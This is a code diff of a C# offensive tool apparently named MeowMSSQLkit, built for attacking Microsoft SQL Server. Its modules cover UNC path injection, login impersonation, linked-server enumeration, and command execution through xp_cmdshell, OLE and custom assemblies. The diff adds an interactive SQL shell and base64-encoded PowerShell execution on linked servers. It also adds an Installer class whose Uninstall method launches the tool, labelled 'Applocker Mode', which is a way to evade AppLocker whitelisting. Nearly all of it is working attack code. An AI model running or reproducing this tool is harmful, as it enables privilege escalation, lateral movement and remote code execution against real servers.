@@ -3,17 +3,19 @@ using System.Text;
 using System.Net;
 using System.Data.SqlClient;
 using System.Collections.Generic;
+using System.Configuration.Install;
 
-namespace MeowMSSQLchecker
+namespace MeowMSSQLkit
 {
     internal class Program
     {
-        static void Main(string[] args)
+        public static void Main(string[] args)
         {
             if (args.Length == 0)
             {
-                Console.WriteLine("Usage : MeowMSSQLchecker.exe Module");
+                Console.WriteLine("Usage : MeowMSSQLkit.exe Module");
                 Console.WriteLine("Module :");
+                Console.WriteLine("    0  TARGET_HOST          SQL Shell.");
                 Console.WriteLine("    1  TARGET_HOST          Check Current User Groups.");
                 Console.WriteLine("    2  TARGET_HOST  LHOST   UNC Path Injection.");
                 Console.WriteLine("    3  TARGET_HOST          Find Impersonate User.");
@@ -21,14 +23,13 @@ namespace MeowMSSQLchecker
                 Console.WriteLine("    5  TARGET_HOST  USER    Try to Impersonate User.");
                 Console.WriteLine("    6  TARGET_HOST          Enumeration All Linked SQL Server.");
                 Console.WriteLine("    7  TARGET_HOST  SERVER  Remote Code Execution at Linked Server.");
-                Console.WriteLine("    8  TARGET_HOST  SERVER  Check Remote to Local Permission");
-                Console.WriteLine("    9  TARGET_HOST  SERVER  Command Execute from Remote Server");
+                Console.WriteLine("    8  TARGET_HOST  SERVER  Check Remote to Local Permission.");
+                Console.WriteLine("    9  TARGET_HOST  SERVER  Command Execute from Remote Server.");
                 return;
             }
 
             int mode = Convert.ToInt32(args[0]);
             string LHOST = "";
-            string CMD = "";
             string USER = "";
             string SERVER = "";
             string sqlServer = args[1];
@@ -52,20 +53,47 @@ namespace MeowMSSQLchecker
                 USER = args[2];
             }
 
-            if (mode == 7 | mode == 8 | mode == 9 & args.Length == 2)
+            if (mode == 7 & args.Length == 2)
             {
                 Console.WriteLine("[!] Missing params : SERVER");
                 return;
             }
-            else if (mode == 7 | mode == 8 | mode == 9 & args.Length == 3)
+            else if (mode == 7 & args.Length == 3)
+            {
+                SERVER = args[2];
+            }
+
+            if (mode == 8 & args.Length == 2)
+            {
+                Console.WriteLine("[!] Missing params : SERVER");
+                return;
+            }
+            else if (mode == 8 & args.Length == 3)
+            {
+                SERVER = args[2];
+            }
+
+            if (mode == 9 & args.Length == 2)
+            {
+                Console.WriteLine("[!] Missing params : SERVER");
+                return;
+            }
+            else if (mode == 9 & args.Length == 3)
             {
                 SERVER = args[2];
             }
 
             Console.WriteLine(SERVER);
 
-            string database = "master";
-            string conString = "Server = " + sqlServer + "; Database = " + database + "; Integrated Security = True";
+            SqlConnection con = Connect_SQL(sqlServer);
+
+
+            SQL_Main(mode, sqlServer, SERVER, USER, LHOST, con);
+        }
+
+        public static SqlConnection Connect_SQL(string sqlServer)
+        {
+            string conString = "Server = " + sqlServer + "; Database = master; Integrated Security = True";
             SqlConnection con = new SqlConnection(conString);
 
             Console.WriteLine("[+] Try to connect to MSSQL Server");
@@ -79,12 +107,37 @@ namespace MeowMSSQLchecker
                 Console.WriteLine("[!] Failed to auth");
                 Environment.Exit(1);
             }
-
             SQL_query("SELECT SYSTEM_USER;", 0, con);
             SQL_query("SELECT USER_NAME();", 4, con);
-
+            return con;
+        }
+        public static void SQL_Main(int mode, string sqlServer, string SERVER, string USER, string LHOST, SqlConnection con)
+        {
+            string CMD;
             switch (mode)
             {
+                case 0:
+                    Console.WriteLine("[+] Module : SQL Shell");
+                    while (true)
+                    {
+                        Console.Write("[?] SQL Command : ");
+                        CMD = Console.ReadLine();
+                        if (CMD == "exit")
+                        {
+                            break;
+                        }
+                        Console.WriteLine("[+] Result :");
+                        try
+                        {
+                            SQL_query(CMD, 5, con);
+                        }
+                        catch (Exception ex)
+                        {
+                            string msg = ex.Message;
+                            Console.WriteLine("[!] Command Error " + msg);
+                        }
+                    }
+                    break;
                 case 1:
                     Console.WriteLine("[+] Module : Checker");
                     Console.Write("[+] Member of public : ");
@@ -96,7 +149,6 @@ namespace MeowMSSQLchecker
                     {
                         Console.WriteLine("No");
                     }
-
                     Console.Write("[+] Member of sysadmin : ");
                     if (SQL_query("SELECT IS_SRVROLEMEMBER('sysadmin');", 1, con))
                     {
@@ -136,14 +188,14 @@ namespace MeowMSSQLchecker
                         return;
                     }
                     SQL_query("SELECT SYSTEM_USER;", 0, con);
-                    remote_code_execution(con);
+                    interactive_mode(con);
                     break;
                 case 5:
                     Console.WriteLine("[+] Module : Impersonate User");
                     Console.WriteLine("[+] Try to impersonate \"" + USER + "\"");
                     SQL_query("EXECUTE AS LOGIN = '" + USER + "';", 2, con);
                     SQL_query("SELECT SYSTEM_USER;", 0, con);
-                    remote_code_execution(con);
+                    interactive_mode(con);
                     break;
                 case 6:
                     Console.WriteLine("[+] Module : List All Linked Servers");
@@ -194,20 +246,48 @@ namespace MeowMSSQLchecker
             }
             con.Close();
         }
-
-        static void remote_code_execution(SqlConnection con)
+        public static void interactive_mode(SqlConnection con)
         {
             int module;
             string CMD;
+            string SERVER;
             while (true)
             {
                 Console.WriteLine("[+] Modules :");
+                Console.WriteLine("      0  SQL Shell");
                 Console.WriteLine("      1  Remote Code Execution - xp_cmdshell");
                 Console.WriteLine("      2  Remote Code Execution - OLE");
                 Console.WriteLine("      3  Remote Code Execution - Custom Assemblies");
-                Console.Write("[?] Choose module :");
+                Console.WriteLine("      4  Remote Code Execution - Linked Server - xp_cmdshell");
+                Console.WriteLine("      5  Analyzer - List Impersonate User");
+                Console.WriteLine("      6  Analyzer - Enumeration All Linked SQL Server.");
+                Console.WriteLine("      7  Analyzer - Check Remote to Local Permission.");
+                Console.WriteLine("      8  Analyzer - Linked Server's Linked Server");
+                Console.Write("[?] Choose module : ");
                 module = Convert.ToInt32(Console.ReadLine());
                 switch (module){
+                    case 0:
+                        Console.WriteLine("[+] Module : SQL Shell");
+                        while (true)
+                        {
+                            Console.Write("[?] SQL Command : ");
+                            CMD = Console.ReadLine();
+                            if (CMD == "exit")
+                            {
+                                break;
+                            }
+                            Console.WriteLine("[+] Result :");
+                            try
+                            {
+                                SQL_query(CMD, 5, con);
+                            }
+                            catch (Exception ex)
+                            {
+                                string msg = ex.Message;
+                                Console.WriteLine("[!] Command Error " + msg);
+                            }
+                        }
+                        break;
                     case 1:
                         Console.WriteLine("[+] Module : Remote Code Execution - xp_cmdshell");
                         Console.WriteLine("[+] Reconfigure xp_cmdshell");
@@ -293,11 +373,53 @@ namespace MeowMSSQLchecker
                         SQL_query("DROP PROCEDURE [dbo].[rce];", 2, con);
                         SQL_query("DROP ASSEMBLY rce_assembly;", 2, con);
                         break;
+                    case 4:
+                        Console.WriteLine("[+] Module : Remote Code Execution - Linked Server - xp_cmdshell");
+                        Console.Write("[?] Server Host : ");
+                        SERVER = Console.ReadLine();
+                        SQL_query("EXEC ('sp_configure ''show advanced options'', 1; reconfigure;') AT " + SERVER, 2, con);
+                        SQL_query("EXEC ('sp_configure ''xp_cmdshell'', 1; reconfigure;') AT " + SERVER, 2, con);
+                        while (true)
+                        {
+                            Console.Write("[?] Powershell Command : ");
+                            CMD = Console.ReadLine();
+                            if (CMD == "exit")
+                            {
+                                break;
+                            }
+                            CMD = Convert.ToBase64String(Encoding.Unicode.GetBytes(CMD));
+                            Console.WriteLine("[+] Command Result :");
+                            SQL_query("EXEC ('xp_cmdshell ''powershell -enc " + CMD + "''') AT " + SERVER, 5, con);
+                        }
+                        break;
+                    case 5:
+                        Console.WriteLine("[+] Module : Analyzer - List Impersonate User");
+                        SQL_query("SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';", 3, con);
+                        break;
+                    case 6:
+                        Console.WriteLine("[+] Module : Analyzer - Enumeration All Linked SQL Server.");
+                        SQL_query("EXEC sp_linkedservers;", 6, con);
+                        break;
+                    case 7:
+                        Console.WriteLine("[+] Module : Check Remote to Local Permission");
+                        Console.Write("[?] Remote Server : ");
+                        SERVER = Console.ReadLine();
+                        Console.Write("[?] Local Server : ");
+                        string sqlServer = Console.ReadLine();
+                        Console.Write("[+] " + SERVER + " to " + sqlServer + " Permission is : ");
+                        SQL_query("select mylogin from openquery(\"" + SERVER + "\", 'select mylogin from openquery(\"" + sqlServer + "\", ''select SYSTEM_USER as mylogin'')')", 7, con);
+                        Console.WriteLine();
+                        break;
+                    case 8:
+                        Console.WriteLine("[+] Module : Analyzer - Linked Server's Linked Server");
+                        Console.Write("[?] Remote Server : ");
+                        SERVER = Console.ReadLine();
+                        SQL_query("EXEC sp_linkedservers AT " + SERVER, 5, con);
+                        break;
                 }
             }
         }
-
-        static bool SQL_query(string cmd, int mode, SqlConnection con)
+        public static bool SQL_query(string cmd, int mode, SqlConnection con)
         {
             bool result;
             SqlCommand command = new SqlCommand(cmd, con);
@@ -305,10 +427,9 @@ namespace MeowMSSQLchecker
             switch (mode)
             {
                 case 0:
-                    reader.Read();
-                    Console.WriteLine("[+] Logged in as : " + reader[0]);
-                    result = true;
+                    read_sql("[+] Logged in as : ", 2, reader);
                     reader.Close();
+                    result = true;
                     break;
                 case 1:
                     reader.Read();
@@ -321,26 +442,19 @@ namespace MeowMSSQLchecker
                     reader.Close();
                     break;
                 case 3:
-                    while(reader.Read())
-                    {
-                        Console.WriteLine("[+] User can be Impersonate : " + reader[0]);
-                    }
-                    result = true;
+                    read_sql("[+] User can be Impersonate : ", 3, reader);
                     reader.Close();
+                    result = true;
                     break;
                 case 4:
-                    reader.Read();
-                    Console.WriteLine("[+] Database Privilege : " + reader[0]);
-                    result = true;
+                    read_sql("[+] Database Privilege : ", 2, reader);
                     reader.Close();
+                    result = true;
                     break;
                 case 5:
-                    while (reader.Read())
-                    {
-                        Console.WriteLine(reader[0]);
-                    }
-                    result = true;
+                    read_sql("", 0, reader);
                     reader.Close();
+                    result = true;
                     break;
                 case 6:
                     List<string> machines = new List<string>();
@@ -380,13 +494,9 @@ namespace MeowMSSQLchecker
                     }
                     break;
                 case 7:
-                    result = true;
-                    while (reader.Read())
-                    {
-                        Console.Write(reader[0]);
-                        break;
-                    }
+                    read_sql("", 1, reader);
                     reader.Close();
+                    result = true;
                     break;
                 case 8:
                     result = true;
@@ -407,7 +517,88 @@ namespace MeowMSSQLchecker
             }
             return result;
         }
+        public static void read_sql(string text, int mode, SqlDataReader reader)
+        {
+            switch (mode)
+            {
+                case 0:
+                    // All WriteLine
+                    while (reader.Read())
+                    {
+                        Console.WriteLine(reader[0]);
+                    }
+                    break;
+                case 1:
+                    // All Write
+                    while (reader.Read())
+                    {
+                        Console.Write(reader[0]);
+                    }
+                    break;
+                case 2:
+                    // Text WriteLine
+                    reader.Read();
+                    Console.WriteLine(text + reader[0]);
+                    break;
+                case 3:
+                    // All Text WriteLine
+                    while (reader.Read())
+                    {
+                        Console.WriteLine(text + reader[0]);
+                    }
+                    break;
+            }
+            return;
+        }
 
+    }
+    [System.ComponentModel.RunInstaller(true)]
+    public class Sample : System.Configuration.Install.Installer
+    {
+        public override void Uninstall(System.Collections.IDictionary savedState)
+        {
+            int mode;
+            string sqlServer;
+            string SERVER = "";
+            string USER = "";
+            string LHOST = "";
+            Console.WriteLine("[+] Welcome to Applocker Mode.");
+            Console.WriteLine("Module :");
+            Console.WriteLine("    0  TARGET_HOST          SQL Shell.");
+            Console.WriteLine("    1  TARGET_HOST          Check Current User Groups.");
+            Console.WriteLine("    2  TARGET_HOST  LHOST   UNC Path Injection.");
+            Console.WriteLine("    3  TARGET_HOST          Find Impersonate User.");
+            Console.WriteLine("    4  TARGET_HOST          Try to Impersonate \"dbo\".");
+            Console.WriteLine("    5  TARGET_HOST  USER    Try to Impersonate User.");
+            Console.WriteLine("    6  TARGET_HOST          Enumeration All Linked SQL Server.");
+            Console.WriteLine("    7  TARGET_HOST  SERVER  Remote Code Execution at Linked Server.");
+            Console.WriteLine("    8  TARGET_HOST  SERVER  Check Remote to Local Permission.");
+            Console.WriteLine("    9  TARGET_HOST  SERVER  Command Execute from Remote Server.");
+            Console.Write("[?] Mode : ");
+            mode = Convert.ToInt32(Console.ReadLine());
+            Console.Write("[?] Connect Server : ");
+            sqlServer = Console.ReadLine();
+
+            if (mode == 2)
+            {
+                Console.Write("[?] LHOST : ");
+                LHOST = Console.ReadLine();
+            }
+            if (mode == 5)
+            {
+                Console.Write("[?] USER : ");
+                USER = Console.ReadLine();
+            }
+            if ((mode - 6) > 0 )
+            {
+                Console.Write("[?] SERVER : ");
+                SERVER = Console.ReadLine();
+            }
+
+            SqlConnection con = Program.Connect_SQL(sqlServer);
+            Program.SQL_Main(mode, sqlServer, SERVER, USER, LHOST, con);
+            return;
+        }
     }
 
 }
